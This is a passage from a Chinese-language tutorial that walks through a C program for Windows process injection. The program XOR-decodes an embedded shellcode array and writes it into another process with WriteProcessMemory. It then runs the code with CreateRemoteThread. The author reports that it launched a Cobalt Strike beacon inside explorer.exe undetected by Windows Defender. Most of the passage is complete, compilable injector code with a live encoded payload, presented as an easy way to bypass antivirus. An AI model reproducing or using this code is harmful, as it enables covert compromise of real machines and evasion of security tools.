                        }
                    }
        }else{
            printf("[-] Unable to allocate memory ...\n");
        }
      }else{
        printf("[-] Unable to retrieve process handle\n");
      }
    }
这段代码将使用密钥“
0x01”对每个字节进行解码后，将我们的shellcode写入内存中，正如我们在第39行中看到的那样，我使用了for循环在shellcode的每个元素上移动，然后在第42行中进行了异或每个带有0x01的元素以检索原始操作码，并在第45行中将已解码的字节写入内存中的特定位置，最后在第51行中，将作为存储计数器的n计数器移至下一个要解码的存储地址，将操作码写入。
进行写入的函数是[WriteProcessMemory（）](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)，参数如下：
  1. process：这是我们之前使用OpenProcess（）检索到的句柄
  2. ase_address + n：这是我们要将操作码写入的地址（从VirtualAllocEx检索到的base_address），n是要移至下一个地址的计数器。
  3. ＆DecodedOpCode：DecodedOpCode字节的地址。
  4. 1：写入的字节数，只有一个字节。
  5. null：因为我们没有指针来接收写入的字节数。
您可以从此[页面](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)检查WriteProcessMemory需要的参数。
编译并运行程序后，我们将获得以下信息：
如我们所见，我们将每个字节写入所需的所需地址，现在，让我们使用x64dbg进行调试，然后转到地址“ 0x2ec0000”以获取以下内容：
如我们所见，我们将原始字节写入了我们想要的地址（从0x2ec0000开始），并且一切正常！
## 执行shellcode
最后，我们需要将shellcode作为线程执行，并且可以通过以下代码使用CreateRemoteThread（）函数来执行该操作：
    #include 
    int main(int argc, char *argv[]){
       unsigned char data[] = "\xfd\x49\x82\xe5\xf1\xe9\xc9\x1\x1\x1\x40\x50\x40\x51\x53\x50\x57\x49\x30\xd3\x64\x49\x8a\x53\x61\x49\x8a\x53\x19\x49\x8a\x53\x21\x49\x8a\x73\x51\x49\xe\xb6\x4b\x4b\x4c\x30\xc8\x49\x30\xc1\xad\x3d\x60\x7d\x3\x2d\x21\x40\xc0\xc8\xc\x40\x0\xc0\xe3\xec\x53\x40\x50\x49\x8a\x53\x21\x8a\x43\x3d\x49\x0\xd1\x67\x80\x79\x19\xa\x3\x74\x73\x8a\x81\x89\x1\x1\x1\x49\x84\xc1\x75\x66\x49\x0\xd1\x51\x8a\x49\x19\x45\x8a\x41\x21\x48\x0\xd1\xe2\x57\x49\xfe\xc8\x40\x8a\x35\x89\x49\x0\xd7\x4c\x30\xc8\x49\x30\xc1\xad\x40\xc0\xc8\xc\x40\x0\xc0\x39\xe1\x74\xf0\x4d\x2\x4d\x25\x9\x44\x38\xd0\x74\xd9\x59\x45\x8a\x41\x25\x48\x0\xd1\x67\x40\x8a\xd\x49\x45\x8a\x41\x1d\x48\x0\xd1\x40\x8a\x5\x89\x49\x0\xd1\x40\x59\x40\x59\x5f\x58\x5b\x40\x59\x40\x58\x40\x5b\x49\x82\xed\x21\x40\x53\xfe\xe1\x59\x40\x58\x5b\x49\x8a\x13\xe8\x4e\xfe\xfe\xfe\x5c\x6b\x1\x48\xbf\x76\x68\x6f\x68\x6f\x64\x75\x1\x40\x57\x48\x88\xe7\x4d\x88\xf0\x40\xbb\x4d\x76\x27\x6\xfe\xd4\x49\x30\xc8\x49\x30\xd3\x4c\x30\xc1\x4c\x30\xc8\x40\x51\x40\x51\x40\xbb\x3b\x57\x78\xa6\xfe\xd4\xea\x72\x5b\x49\x88\xc0\x40\xb9\x57\x1e\x1\x1\x4c\x30\xc8\x40\x50\x40\x50\x6b\x2\x40\x50\x40\xbb\x56\x88\x9e\xc7\xfe\xd4\xea\x58\x5a\x49\x88\xc0\x49\x30\xd3\x48\x88\xd9\x4c\x30\xc8\x53\x69\x1\x3\x41\x85\x53\x53\x40\xbb\xea\x54\x2f\x3a\xfe\xd4\x49\x88\xc7\x49\x82\xc2\x51\x6b\xb\x5e\x49\x88\xf0\x49\x88\xdb\x48\xc6\xc1\xfe\xfe\xfe\xfe\x4c\x30\xc8\x53\x53\x40\xbb\x2c\x7\x19\x7a\xfe\xd4\x84\xc1\xe\x84\x9c\x0\x1\x1\x49\xfe\xce\xe\x85\x8d\x0\x1\x1\xea\xd2\xe8\xe5\x0\x1\x1\xe9\xa3\xfe\xfe\xfe\x2e\x34\x6f\x6a\x4e\x1\x2\x9b\xf5\xba\xe1\xdc\x3f\x6d\x86\xa4\x4\x4a\x83\x50\x2e\xd4\x69\x66\x14\xd7\xfc\x11\xf2\xa4\x91\x61\xeb\xbb\xff\x1e\x27\x2c\x5\xf2\xed\xca\xd5\x72\x95\x56\x99\x5f\xdf\xed\xb9\x3f\xd8\x4f\x33\xcd\x39\xe2\x95\x7\x1c\x72\x2c\xb2\xd5\x63\x27\xcb\x5b\xaf\x53\xee\xf5\xc1\x80\x76\x96\xcf\xd4\x1\x54\x72\x64\x73\x2c\x40\x66\x64\x6f\x75\x3b\x21\x4c\x6e\x7b\x68\x6d\x6d\x60\x2e\x35\x2f\x31\x21\x29\x62\x6e\x6c\x71\x60\x75\x68\x63\x6d\x64\x3a\x21\x4c\x52\x48\x44\x21\x39\x2f\x31\x3a\x21\x56\x68\x6f\x65\x6e\x76\x72\x21\x4f\x55\x21\x34\x2f\x30\x3a\x21\x55\x73\x68\x65\x64\x6f\x75\x2e\x35\x2f\x31\x3a\x21\x46\x55\x43\x36\x2f\x35\x3a\x21\x48\x6f\x67\x6e\x51\x60\x75\x69\x2f\x33\x28\xc\xb\x1\x60\xe3\x48\x6d\xb4\x30\x93\x21\x18\xc8\xab\x68\x2a\xbd\xc0\x8a\x29\xf8\x81\x6d\x93\xad\xbb\xeb\x7\x33\x4\xc3\x39\x1a\xe\x3f\x84\x38\xc2\x8b\x13\x20\xe6\x50\x81\x81\x31\x3\xe6\xcd\x8e\x35\x39\xd0\xe3\x49\xf1\x29\x20\xe8\xd6\xa7\x46\x59\xf\x49\x8d\x1c\x17\xac\x7c\xac\xbc\xa5\x41\x59\x4a\x5e\x3c\xa8\xd1\x54\x18\xde\x42\xf0\x68\xbb\xd\x80\x6e\x90\x73\x95\xc7\x64\xb5\x8c\x5a\x5\x59\x69\x73\x92\xc2\xbd\x47\x10\xa\xf9\x51\x27\x53\x14\x48\xda\x37\xc\x74\x5c\x80\x5c\x46\x1a\xe\x5f\x24\x51\x35\x22\xc0\x68\xfc\x23\x74\x5c\xeb\xa5\x2f\x41\x99\x13\x73\x8f\xd5\xdf\xee\xf3\x43\xdc\x9\x6a\xa2\x75\x12\x6d\xa8\x83\xfd\x24\xed\xe7\x23\xeb\x9a\x4a\x59\xa9\x84\x66\xa0\x79\x1f\xab\x6\x30\xd6\xce\x4b\x75\xf0\x31\x62\x3f\xf\x5d\x16\x52\x2e\x68\x66\x93\xf9\x29\xff\xd7\x6e\xcf\x7\xc4\xdc\xb3\xc\x70\xf5\xdb\x19\x5f\x27\x1\x40\xbf\xf1\xb4\xa3\x57\xfe\xd4\x49\x30\xc8\xbb\x1\x1\x41\x1\x40\xb9\x1\x11\x1\x1\x40\xb8\x41\x1\x1\x1\x40\xbb\x59\xa5\x52\xe4\xfe\xd4\x49\x92\x52\x52\x49\x88\xe6\x49\x88\xf0\x49\x88\xdb\x40\xb9\x1\x21\x1\x1\x48\x88\xf8\x40\xbb\x13\x97\x88\xe3\xfe\xd4\x49\x82\xc5\x21\x84\xc1\x75\xb7\x67\x8a\x6\x49\x0\xc2\x84\xc1\x74\xd6\x59\x59\x59\x49\x4\x1\x1\x1\x1\x51\xc2\xe9\x9e\xfc\xfe\xfe\x30\x31\x2f\x31\x2f\x31\x2f\x30\x1\x59\x57\x3c\xd3";
      // The PID that you want to use
       int process_id = atoi(argv[1]);
      // Declare a new handle as process variable
      // PROCESS_ALL_ACCESS
      HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, 0, process_id);
      // If the operation succeeded it will return the handle
      if(process){
        printf("[+] Handle retrieved successfully!\n");
        // We can print it as pointer using printf
        printf("[+] Handle value is %p\n", process);
        // Allocate space
        // Define the base_address variable which will save the allocated memory address
        LPVOID base_address;
        base_address = VirtualAllocEx(process, NULL, sizeof(data), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if(base_address){
            printf("[+] Allocated based address is 0x%x\n", base_address);
                            // Data chars counter
                    int i;
                    // Base address counter
                    int n = 0;
                    for(i = 0; i<=sizeof(data); i++){
                        // Decode shellcode opcode
                        char DecodedOpCode = data[i] ^ 0x01;
                        // Write the decoded bytes in memory address
                        if(WriteProcessMemory(process, base_address+n, &DecodedOpCode, 1, NULL)){
                            printf("[+] Byte wrote sucessfully!\n");
                            // Increase memory address by 1
                            n++;
                        }
                    }
                    // Run our code as RemoteThread
                    CreateRemoteThread(process, NULL, 100,(LPTHREAD_START_ROUTINE)base_address, NULL, 0, 0x5151);
        }else{
            printf("[-] Unable to allocate memory ...\n");
        }
      }else{
        printf("[-] Unable to retrieve process handle\n");
      }
    }
正如我们在第55行中看到的那样，我们使用CreateRemoteThread（）函数在explorer.exe上作为线程执行Shellcode，并且CreateRemoteThread（）采用以下参数：
  1. process:这是我们之前使用OpenProcess（）检索到的句柄
  2. null:获取默认的安全描述符；可以在[这里](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)获取详细信息。
  3. 100：堆栈的初始大小。
  4. base_address：这是我们的shellcode的第一个操作码。
  5. null：没有参数传递给线程。
  6. 0：线程在创建后立即运行。
  7. 0x5151：线程ID
在运行代码之后，我们将获得以下内容：
我们在Windows Explorer中运行了一个CobaltStrike的beacon，而没有被Windows Defender捕获。
## 结论
通过使用这种技术对shellcode进行编码和解码，我们可以轻松绕过AV保护，并在另一个进程中运行shellcode。
您可以根据需要自定义编码器，但也必须编辑解码器，还可以修改代码以满足执行上的需求，并且部分代码仅出于教育目的而编写。